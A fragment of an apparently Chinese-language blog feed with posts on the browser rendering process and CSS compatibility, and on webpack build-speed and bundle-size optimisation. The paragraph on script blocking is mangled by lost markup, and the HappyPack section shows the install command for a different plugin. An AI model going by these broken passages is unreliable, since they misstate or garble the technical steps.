title="渲染过程"></a>渲染过程</h3><p>要了解浏览器页面的渲染过程，首先得知道<code>关键渲染路径</code>。<strong>关键渲染路径</strong>指浏览器从最初接收请求得到HTML、CSS、JS等资源，然后解析、构建、渲染、布局、绘制、合成，到最后呈现在用户眼前界面的整个过程。</p><p>笔者将关键渲染路径划分理解，页面的渲染过程分为以下几部分。</p><ul><li><strong>解析文件</strong><ul><li>将<code>html文件</code>转换为DOM树</li><li>将<code>css文件</code>转换为CSSOM树</li><li>将DOM树和CSSOM树合并生成渲染树</li></ul></li><li><strong>绘制图层</strong><ul><li>根据渲染树生成布局渲染树(<code>回流</code>)</li><li>根据布局渲染树生成绘制渲染树(<code>重绘</code>)</li></ul></li><li><strong>合成图层</strong>：根据绘制渲染树合成图层显示在屏幕上</li></ul><h5 id="解析文件"><a href="#解析文件" class="headerlink" title="解析文件"></a>解析文件</h5><p>HTML文档描述一个页面的结构，浏览器通过<code>HTML解析器</code>将HTML解析成<code>DOM树</code>结构。HTML文档中所有内容皆为节点，各节点间拥有层级关系，彼此相连，构成DOM树。构建<code>DOM树</code>的过程：读取HTML文档的<strong>字节</strong>(Bytes)，将字节转换成<strong>字符</strong>(Chars)，依据字符确定<strong>标签</strong>(Tokens)，将标签转换成<strong>节点</strong>(Nodes)，以节点为基准构建<strong>DOM树</strong>。</p><p>CSS文档描述一个页面的表现，浏览器通过<code>CSS解析器</code>将CSS解析成<code>CSSOM树</code>结构，与DOM树结构比较像。CSS文档中所有内容皆为节点，与HTML文档中的节点一一对应，各节点间拥有层级关系，彼此相连，构成CSSOM树。构建<code>CSSOM树</code>的过程：读取CSS文档的<strong>字节</strong>(Bytes)，将字节转换成<strong>字符</strong>(Chars)，依据字符确定<strong>标签</strong>(Tokens)，将标签转换成<strong>节点</strong>(Nodes)，以节点为基准构建<strong>CSSOM树</strong>。与DOM树的构建过程完全一致。</p><p>在构建DOM树的过程中，当<code>HTML解析器</code>遇到<code>时会立即阻塞DOM树的构建，将控制权移交给浏览器的`JS引擎`，等到`JS引擎`运行完毕，浏览器才会从中断的地方恢复DOM树的构建。</code>的脚本加载完成后，<code>JS引擎</code>通过<code>DOM API</code>和<code>CSSOM API</code>操作DOM树和CSSOM树。为何会产生<strong>渲染阻塞</strong>呢？其根本原因在于：JS操作DOM后，浏览器无法预测未来DOM的具体内容，为了防止无效操作和节省资源，只能阻塞DOM树的构建。</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\1619766148465.png" alt="1619766148465"></p><p> 浏览器的<code>渲染引擎</code>将DOM树和CSSOM树合并生成渲染树，只渲染需显示的节点及其样式。<strong>DOM树</strong>、<strong>CSSOM树</strong>和<strong>渲染树</strong>三者的构建并无<code>先后条件</code>和<code>先后顺序</code>，并非完全独立而是会有交叉并行构建的情况。因此会形成一边加载，一边解析，一边渲染的工作现象。 </p><h5 id="绘制图层"><a href="#绘制图层" class="headerlink" title="绘制图层"></a>绘制图层</h5><p>进入绘制阶段，遍历渲染树，调用渲染器的<code>paint()</code>在屏幕上绘制内容。根据渲染树布局计算样式，即每个节点在页面中的布局、尺寸等几何属性。HTML默认是流式布局，CSS和JS会打破这种布局，改变DOM的几何属性和外观属性。在绘制过程中，根据渲染树布局，再根据布局绘制，这就是常听常说的<strong>回流重绘</strong>。</p><p>在此涉及到两个核心概念：<strong>回流</strong>、<strong>重绘</strong>。笔者用两句精简的话分别概括它们。</p><ul><li><strong>回流</strong>：几何属性需改变的渲染</li><li><strong>重绘</strong>：更改外观属性而不影响几何属性的渲染</li></ul><p>当生成渲染树后，至少会渲染一次。在后续交互过程中，还会不断地重新渲染。这时只会<code>回流重绘</code>或<code>只有重绘</code>。因此引出一个定向法则：<strong>回流必定引发重绘，重绘不一定引发回流</strong>。</p><p>在下一章中，笔者会安排整章篇幅讲解<strong>回流重绘</strong>以及如何让回流重绘的影响最小化。相信下一章提及的<strong>属性排序</strong>应该比较少同学了解过或使用过，敬请期待。</p><h5 id="合成图层"><a href="#合成图层" class="headerlink" title="合成图层"></a>合成图层</h5><p>将回流重绘生成的图层逐张合并并显示在屏幕上。上述几个步骤并不是一次性顺序完成的，若DOM或CSSOM被修改，上述过程会被重复执行。实际上，CSS和JS往往会多次修改DOM或CSSOM，简单来说就是用户的交互操作引发了网页的重渲染。</p><h3 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h3><p> <strong>兼容性</strong>又名<code>网站兼容性</code>或<code>网页兼容性</code>，指网页在各种浏览器上的显示效果可能不同而产生浏览器和网页间的兼容问      题。 </p><p> 处理CSS兼容性的三种方式 :</p><h5 id="磨平浏览器默认样式"><a href="#磨平浏览器默认样式" class="headerlink" title="磨平浏览器默认样式"></a>磨平浏览器默认样式</h5><p> 每个浏览器的CSS默认样式不尽相同，所以最简单最有效的方式就是<code>对其默认样式初始化</code> 。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 可以接入其他<code>css文件</code>前将其导入 ，也可以自定义默认样式。</p><h5 id="插入浏览器私有属性"><a href="#插入浏览器私有属性" class="headerlink" title="插入浏览器私有属性"></a>插入浏览器私有属性</h5><p> 通常编写CSS都会在一些CSS3属性前加入<code>-webkit-</code>、<code>-moz-</code>、<code>-ms-</code>或<code>-o-</code>，这些奇形怪状写到手软的东西就是<strong>浏览器私有属性</strong> 。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Chrome、Safari、New Opera、New Edge */</span></span><br><span class="line">-webkit-<span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">10px</span>, <span class="number">10px</span>);</span><br><span class="line"><span class="comment">/* Firefox */</span></span><br><span class="line">-moz-<span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">10px</span>, <span class="number">10px</span>);</span><br><span class="line"><span class="comment">/* IExplorer、Old Edge */</span></span><br><span class="line">-ms-<span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">10px</span>, <span class="number">10px</span>);</span><br><span class="line"><span class="comment">/* Old Opera */</span></span><br><span class="line">-o-<span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">10px</span>, <span class="number">10px</span>);</span><br><span class="line"><span class="comment">/* 标准 */</span></span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">10px</span>, <span class="number">10px</span>);</span><br></pre></td></tr></table></figure><p> 每个CSS3属性都编写这么一堆兼容性代码，无疑是对生命最大的浪费。在使用Webpack打包项目代码的过程中，可接入<a href="https://github.com/postcss/postcss-loader">postcss-loader</a>和<a href="https://github.com/csstools/postcss-preset-env">postcss-preset-env</a>，<code>postcss-preset-env</code>内置了<code>autoprefixer</code>，它会依据<code>Caniuse</code>所提供的数据对代码里的CSS3属性批量添加私有属性。 </p><h5 id="CSS-Hack"><a href="#CSS-Hack" class="headerlink" title="CSS Hack"></a>CSS Hack</h5><p> <strong>CSS Hack</strong>指针对不同浏览器编写不同CSS，让它能够同时兼容不同浏览器，在不同浏览器中渲染想要的效果。当然也可反过来利用<code>CSS Hack</code>为不同版本的浏览器定制不同效果。 (现在不推荐使用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.elem &#123;</span><br><span class="line">    background-color: #f66; &#x2F;* IExplorer 8+ *&#x2F;</span><br><span class="line">    *background-color: #f66; &#x2F;* IExplorer 7 *&#x2F;</span><br><span class="line">    _background-color: #f66; &#x2F;* IExplorer 6 *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="浏览器" scheme="http://aiolimp.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
    <category term="浏览器" scheme="http://aiolimp.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>webpack优化</title>
    <link href="http://aiolimp.com/2021/08/07/webpack%E4%BC%98%E5%8C%96/"/>
    <id>http://aiolimp.com/2021/08/07/webpack%E4%BC%98%E5%8C%96/</id>
    <published>2021-08-07T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.213Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="优化webpack配置"><a href="#优化webpack配置" class="headerlink" title="优化webpack配置"></a>优化webpack配置</h1><h2 id="1-优化打包速度"><a href="#1-优化打包速度" class="headerlink" title="1. 优化打包速度"></a>1. 优化打包速度</h2><h3 id="1-1合理的配置mode参数与devtool参数"><a href="#1-1合理的配置mode参数与devtool参数" class="headerlink" title="1.1合理的配置mode参数与devtool参数"></a>1.1合理的配置mode参数与devtool参数</h3><p><code>mode</code>可设置<code>development`` production</code>两个参数<br> 如果没有设置，<code>webpack4</code> 会将 <code>mode</code> 的默认值设置为 <code>production</code><br> <code>production</code>模式下会进行<code>tree shaking</code>(去除无用代码)和<code>uglifyjs</code>(代码压缩混淆)</p><h3 id="1-2缩小文件搜索范围"><a href="#1-2缩小文件搜索范围" class="headerlink" title="1.2缩小文件搜索范围"></a>1.2缩小文件搜索范围</h3><h4 id="选项"><a href="#选项" class="headerlink" title=":选项"></a>:选项</h4><p>在配置文件中，其实有一个<code>resovle.alias</code>选项，它可以创建<code>import</code>和<code>reuquire</code>别名，来确保模块引入变得更简单，同时<code>webpack</code>在打包的时候也能更快的找到引入文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      <span class="comment">// 配置style路径的别名</span></span><br><span class="line">      style: path.resolve(__dirname, <span class="string">&#x27;src/style/&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;style/style.scss&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;style/style.css&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="include、exclude选项"><a href="#include、exclude选项" class="headerlink" title="include、exclude选项"></a>include、exclude选项</h4><p>当我们使用<code>loader</code>的时候，我们可以配置<code>include</code>来指定只解析该路径下的对应文件，同时我们可以配置<code>exclude</code>来指定不解析该路径下的对应文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        use: [miniCssExtractPlugin.loader, <span class="string">&#x27;css-loader&#x27;</span>, <span class="string">&#x27;postcss-loader&#x27;</span>],</span><br><span class="line">        include: [path.resolve(__dirname, <span class="string">&#x27;src&#x27;</span>)]  <span class="comment">// 只解析src路径下的css</span></span><br><span class="line">      &#125;</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        use: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">        exclude: <span class="regexp">/node_modules/</span>   <span class="comment">// 不解析node_modules路径下的js</span></span><br><span class="line">      &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="noParse选项"><a href="#noParse选项" class="headerlink" title="noParse选项"></a>noParse选项</h4><p>我们可以在<code>module.noParse</code>选项中，只配置不需要解析的文件。通常我们会忽略一些大型插件从而来提高构建性能。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    noParse: <span class="regexp">/jquery|lodash/</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="extensions-选项"><a href="#extensions-选项" class="headerlink" title="extensions 选项"></a>extensions 选项</h4><p><code>webpack</code>会根据<code>extensions</code>定义的后缀查找文件(频率较高的文件类型优先写在前面)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  resolve: &#123;</span><br><span class="line">   extensions:[<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;.js&#x27;</span>,<span class="string">&#x27;.json&#x27;</span>,<span class="string">&#x27;.vue&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1-3使用HappyPack开启多进程Loader转换"><a href="#1-3使用HappyPack开启多进程Loader转换" class="headerlink" title="1.3使用HappyPack开启多进程Loader转换"></a>1.3使用HappyPack开启多进程Loader转换</h3><blockquote><p>在webpack构建过程中，实际上耗费时间大多数用在loader解析转换以及代码的压缩中。日常开发中我们需要使用Loader对js，css，图片，字体等文件做转换操作，并且转换的文件数据量也是非常大。由于js单线程的特性使得这些转换操作不能并发处理文件，而是需要一个个文件进行处理。HappyPack的基本原理是将这部分任务分解到多个子进程中去并行处理，子进程处理完成后把结果发送到主进程中，从而减少总的构建时间</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 2.0.0</span><br><span class="line">yarn add webpack-parallel-uglify-plugin -D</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> HappyPack = <span class="built_in">require</span>(<span class="string">&quot;happypack&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> os = <span class="built_in">require</span>(<span class="string">&quot;os&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> HappyThreadPool = HappyPack.ThreadPool(&#123;<span class="attr">size</span>: os.cpus().length&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        use: [&#123;</span><br><span class="line">          loader: <span class="string">&#x27;happypack/loader?id=happyBabelLoader&#x27;</span></span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> HappyPack(&#123;</span><br><span class="line">      id: <span class="string">&#x27;happyBabelLoader&#x27;</span>,  <span class="comment">// 与loader对应的id标识</span></span><br><span class="line">      <span class="comment">// 用法跟loader配置一样</span></span><br><span class="line">      loaders: [</span><br><span class="line">        &#123;<span class="attr">loader</span>: <span class="string">&#x27;babel-loader&#x27;</span>, <span class="attr">options</span>: &#123;&#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      threadPool: HappyThreadPool  <span class="comment">// 共享进程池</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1-4使用webpack-parallel-uglify-plugin-增强代码压缩"><a href="#1-4使用webpack-parallel-uglify-plugin-增强代码压缩" class="headerlink" title="1.4使用webpack-parallel-uglify-plugin 增强代码压缩"></a>1.4使用webpack-parallel-uglify-plugin 增强代码压缩</h3><blockquote><p>上面对于loader转换已经做优化，那么下面还有另一个难点就是优化代码的压缩时间。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add webpack-parallel-uglify-plugin -D</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> ParallelUglifyPlugin = <span class="built_in">require</span>(<span class="string">&quot;webpack-parallel-uglify-plugin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimizer: [</span><br><span class="line">      <span class="keyword">new</span> ParallelUglifyPlugin(&#123;</span><br><span class="line">        <span class="comment">// 缓存路径</span></span><br><span class="line">        cacheDir: <span class="string">&#x27;.cache/&#x27;</span>,  </span><br><span class="line">        <span class="comment">// 压缩配置</span></span><br><span class="line">        uglifyJS: &#123;</span><br><span class="line">          output: &#123;</span><br><span class="line">            comments: <span class="literal">false</span>,</span><br><span class="line">            beautify: <span class="literal">false</span></span><br><span class="line">          &#125;,</span><br><span class="line">          compress: &#123;</span><br><span class="line">            drop_console: <span class="literal">true</span>,</span><br><span class="line">            collapse_vars: <span class="literal">true</span>,</span><br><span class="line">            reduce_vars: <span class="literal">true</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-5配置缓存"><a href="#1-5配置缓存" class="headerlink" title="1.5配置缓存"></a>1.5配置缓存</h3><p>我们每次执行构建都会把所有的文件都重新编译一边，如果我们可以将这些重复动作缓存下来的话，对下一步的构建速度会有很大的帮助。</p><p>现在大部分的<code>loader</code>都提供了缓存选项，但并非所有的<code>loader</code>都有，因此我们最好自己去配置一下全局的缓存动作。</p><p>在<code>Webpack5</code>之前，我们都使用了<code>cache-loader</code>，而在<code>webpack5</code>中，官方提供了一个<code>cache</code>选项给我们带来持久性缓存。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开发环境</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  cache: &#123;</span><br><span class="line">    type: <span class="string">&#x27;memory&#x27;</span>  <span class="comment">// 默认配置</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产环境</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  cache: &#123;</span><br><span class="line">    type: <span class="string">&#x27;filesystem&#x27;</span>,</span><br><span class="line">    buildDependencies: &#123;</span><br><span class="line">      config: [__filename]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-优化打包文件体积"><a href="#2-优化打包文件体积" class="headerlink" title="2. 优化打包文件体积"></a>2. 优化打包文件体积</h2><blockquote><p>打包的速度我们是进行了优化，但是打包后的文件体积却是十分大，造成了页面加载缓慢，浪费流量等，接下来让我们从文件体积上继续优化</p></blockquote><h3 id="2-1-引入webpack-bundle-analyzer分析打包后的文件"><a href="#2-1-引入webpack-bundle-analyzer分析打包后的文件" class="headerlink" title="2.1 引入webpack-bundle-analyzer分析打包后的文件"></a>2.1 引入webpack-bundle-analyzer分析打包后的文件</h3><p><code>webpack-bundle-analyzer</code>将打包后的内容束展示为方便交互的直观树状图，让我们知道我们所构建包中真正引入的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D webpack-bundle-analyzer</span><br></pre></td></tr></table></figure><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/16/16f0d6291cc2f70c~tplv-t2oaga2asx-watermark.awebp" alt="carbon-6.png"></p><p>接下来在<code>package.json</code>里配置启动命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;analyz&quot;: &quot;NODE_ENV&#x3D;production npm_config_report&#x3D;true npm run build&quot; </span><br></pre></td></tr></table></figure><p>windows请安装<code>npm i -D cross-env</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;analyz&quot;: &quot;cross-env NODE_ENV&#x3D;production npm_config_report&#x3D;true npm run build&quot; </span><br></pre></td></tr></table></figure><p>接下来<code>npm run analyz</code>浏览器会自动打开文件依赖图的网页</p><h3 id="2-2-externals"><a href="#2-2-externals" class="headerlink" title="2.2 externals"></a>2.2 externals</h3><blockquote><p>按照官方文档的解释，如果我们想引用一个库，但是又不想让<code>webpack</code>打包，并且又不影响我们在程序中以<code>CMD、AMD</code>或者<code>window/global</code>全局等方式进行使用，那就可以通过配置<code>Externals</code>。这个功能主要是用在创建一个库的时候用的，但是也可以在我们项目开发中充分使用 <code>Externals</code>的方式，我们将这些不需要打包的静态资源从构建逻辑中剔除出去，而使用 <code>CDN</code> 的方式，去引用它们。</p></blockquote><p>有时我们希望我们通过<code>script</code>引入的库，如用CDN的方式引入的<code>jquery</code>，我们在使用时，依旧用<code>require</code>的方式来使用，但是却不希望<code>webpack</code>将它又编译进文件中。这里官网案例已经足够清晰明了，大家有兴趣可以点击了解  </p><p><a href="https://link.juejin.cn/?target=https://webpack.js.org/configuration/externals/%23root">webpack</a> 官网案例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  src=<span class="string">&quot;https://code.jquery.com/jquery-3.1.0.js&quot;</span></span><br><span class="line">  integrity=<span class="string">&quot;sha256-slogkvB1K3VOkzAI8QITxV3VzpOnkeNVsKvtkYLMjfk=&quot;</span></span><br><span class="line">  crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  externals: &#123;</span><br><span class="line">    jquery: <span class="string">&#x27;jQuery&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">import</span> $ <span class="keyword">from</span> <span class="string">&#x27;jquery&#x27;</span>;</span><br><span class="line">$(<span class="string">&#x27;.my-element&#x27;</span>).animate(<span class="comment">/* ... */</span>);</span><br></pre></td></tr></table></figure><h3 id="2-3-Tree-shaking"><a href="#2-3-Tree-shaking" class="headerlink" title="2.3 Tree-shaking"></a>2.3 Tree-shaking</h3><blockquote><p>这里单独提一下<code>tree-shaking</code>,是因为这里有个坑。<code>tree-shaking</code>的主要作用是用来清除代码中无用的部分。目前在<code>webpack4</code> 我们设置<code>mode</code>为<code>production</code>的时候已经自动开启了<code>tree-shaking</code>。但是要想使其生效，生成的代码必须是ES6模块。不能使用其它类型的模块如<code>CommonJS</code>之流。如果使用<code>Babel</code>的话，这里有一个小问题，因为<code>Babel</code>的预案（preset）默认会将任何模块类型都转译成<code>CommonJS</code>类型，这样会导致<code>tree-shaking</code>失效。修正这个问题也很简单，在<code>.babelrc</code>文件或在<code>webpack.config.js</code>文件中设置<code>modules： false</code>就好了</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .babelrc</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;presets&quot;</span>: [</span><br><span class="line">    [<span class="string">&quot;@babel/preset-env&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;modules&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;</span><br><span class="line">            test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">            use: &#123;</span><br><span class="line">                loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">                options: &#123;</span><br><span class="line">                    presets: [<span class="string">&#x27;@babel/preset-env&#x27;</span>, &#123; <span class="attr">modules</span>: <span class="literal">false</span> &#125;]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;，</span><br><span class="line">            exclude: <span class="regexp">/(node_modules)/</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
